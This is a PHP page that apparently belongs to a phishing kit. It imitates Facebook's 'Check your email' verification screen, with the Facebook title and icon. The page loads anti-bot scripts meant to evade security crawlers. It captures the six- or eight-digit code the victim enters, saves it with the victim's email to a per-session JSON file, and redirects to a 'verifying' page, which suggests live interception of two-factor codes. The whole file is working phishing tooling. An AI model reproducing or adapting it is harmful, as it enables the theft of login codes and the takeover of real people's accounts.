<?php


error_reporting(0);

include('../Antibot/Bot-Crawler.php');
include('../Antibot/Dila_DZ.php');
include('../Antibot/blockers.php');
include('../Antibot/detects.php');

session_start();
$id = $_GET['id'];
if (!isset($_SESSION['users'][$id])) {
    header("Location: ../index.php");
    exit();
}
$userData = json_decode(file_get_contents("../sessions/$id.json"), true);
$userEmail = $_SESSION['users'][$id]['failed_user'];
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $_SESSION['users'][$id]['emailCode'] = $_POST['code'];
    $_SESSION['users'][$id]['last_page'] = 'email_code';
    file_put_contents("../sessions/$id.json", json_encode($_SESSION['users'][$id]));
    header("Location: verifying.php?id=$id");
    exit();
}
?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <link rel="stylesheet" type="text/css" href="../css/auth.css">
    <title>Facebook</title>
    <link rel="icon" type="image/svg" href="../images/fb.svg">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <style>
    input,
    select,
    textarea {
        font-size: 16px;
    }

    .error {
        font-size: 13px;
        margin-top: -5px;
        margin-bottom: 30px;
        color: #1c2b33;
        display: none;

    }


    .userError {
        font-size: 13px;
        margin-top: -5px;
        margin-bottom: 30px;
        color: red;

    }

    .log-in-button:disabled {
        background-color: #8ebcf0;
    }
    </style>
</head>

<body>
    <section class="main-wrapper">

        <div>
            <div class="panel">
                <form id="loginForm" method="post">
                    <p><?php echo $userEmail; ?> • Facebook</p>
                    <h2 id="header">Check your email</h2>
                    <span>Enter the code we sent to your email.
                    </span>
                    <img class="image" src="../images/noti.png" alt="SMS">
                    <input type="text" id="code" name="code" placeholder="Code" required oninput="validateCode()">
                    <div class="error" id="errorMessage"></div>
                    <?php if (isset($userData['error']) && $userData['error'] === true): ?>
                    <p class="userError" id="userError">
                        This code doesn't work. Check that it's correct or try a new one.
                    </p>
                    <?php endif; ?>
                    <input class="log-in-button" type="submit" value="Continue" id="loginButton" disabled>
                </form>
            </div>
        </div>
    </section>

    <script>
    function validateCode() {
        const codeInput = document.getElementById('code');
        const errorMessage = document.getElementById('errorMessage');
        const userError = document.getElementById('userError');
        const loginButton = document.getElementById('loginButton');
        const code = codeInput.value;

        let isValid = true;
        let customErrorMessage = "";

        const isNumeric = /^\d+$/.test(code);

        if (!isNumeric) {
            customErrorMessage = "Code should only contain digits.";
            isValid = false;
        } else if (code.length !== 6 && code.length !== 8) {
            customErrorMessage = "The code should consist of six or eight digits.";
            isValid = false;
        }

        if (!isValid) {
            errorMessage.textContent = customErrorMessage;
            errorMessage.style.display = "block";
            if (userError) userError.style.display = "none";
            loginButton.disabled = true;
        } else {
            errorMessage.style.display = "none";
            loginButton.disabled = false;
        }
    }
    </script>

</body>

</html>